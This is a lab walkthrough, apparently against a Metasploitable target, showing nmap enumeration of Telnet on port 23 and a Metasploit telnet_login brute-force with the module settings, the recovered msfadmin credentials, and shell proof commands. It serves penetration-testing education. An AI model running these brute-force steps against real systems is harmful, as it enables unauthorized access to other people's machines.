# <div align="center">Telnet Enumeration & Exploitation</div>

<div align="center">
This target hosts a Telnet service running on port 23, which was identified during enumeration and exploited to gain unauthorized access through weak credentials.
</div>

<p align="center">
  <img width="350" height="350" alt="image" src="https://github.com/user-attachments/assets/34aaf678-eada-4271-b2d0-48216e86d8ba" />
</p>

## 1. Telnet Reconnaissance using Nmap

### 🔍 Command Used

nmap -p- -sV -sC <target-ip>

### 📌 Explanation

- `-p-` → Scans all 65535 ports  
- `-sV` → Detects service versions running on open ports  
- `-sC` → Runs default Nmap scripts for enumeration  

### 🎯 Purpose

This scan helps identify open ports and services, highlighting Telnet as a potential entry point.

### 📊 Key Finding

- Port 23/tcp → Open  
- Service → Telnet  
- Version → Linux telnetd / BusyBox telnet  

👉 Telnet is accessible and transmits data in plaintext, making it highly insecure and vulnerable to credential-based attacks.

<p align="center">
  <img width="940" height="519" alt="image" src="https://github.com/user-attachments/assets/f319a087-1688-4daa-933f-625cae1a6ac0" />
</p>

## 2. Searching for Telnet Module in Metasploit

### 🔍 Command Used

msfconsole  
search telnet_login  

### 📌 Explanation

Metasploit provides an auxiliary module for performing Telnet brute-force attacks using username and password lists.

<p align="center">
  <img width="940" height="247" alt="image" src="https://github.com/user-attachments/assets/27026afc-f9d6-4353-96cc-ba16d19f7d85" />
</p>

## 3. Selecting the Module

The following module was selected:

`auxiliary/scanner/telnet/telnet_login`

👉 This module performs Telnet login attempts using supplied credentials.

## 4. Configuring Module Options

### 🔍 Commands Used

options  

set RHOSTS <target-ip>  
set USER_FILE /home/kali/Desktop/telnet_user  
set PASS_FILE /home/kali/Desktop/telnet_password  
set VERBOSE true  
set STOP_ON_SUCCESS true  

### 📌 Explanation

- `USER_FILE` → Contains list of usernames  
- `PASS_FILE` → Contains list of passwords  
- `VERBOSE` → Displays each login attempt  
- `STOP_ON_SUCCESS` → Stops after finding valid credentials

<p align="center">
  <img width="940" height="684" alt="image" src="https://github.com/user-attachments/assets/48b4a2a2-bef5-458e-9e18-59a7b4d6fe9e" />
</p>

## 5. Brute Force Execution

### 🔍 Command Used

exploit  

### 📊 Result

👉 Valid credentials discovered:

- Username: `msfadmin`  
- Password: `msfadmin`  

👉 Telnet session successfully established.

<p align="center">
  <img width="940" height="437" alt="image" src="https://github.com/user-attachments/assets/78dfd9bc-5ece-4002-83c3-99606e4a4251" />
</p>

## 6. Proof of Exploitation

### 🔍 Commands Used

sessions -i 1  

ls  

mkdir Telnet_Completed  

### 📌 Explanation

- `sessions -i 1` → Interact with the active session  
- `ls` → Verify directory contents  
- `mkdir` → Create folder as proof of access  

👉 Successful execution confirms shell access on the target system.

<p align="center">
  <img width="940" height="392" alt="image" src="https://github.com/user-attachments/assets/47417979-282b-44a0-89b6-aae35b231a2c" />
</p>

  <img width="940" height="257" alt="image" src="https://github.com/user-attachments/assets/1133d054-1ab9-4d25-8b51-dff9fbcf3b44" />








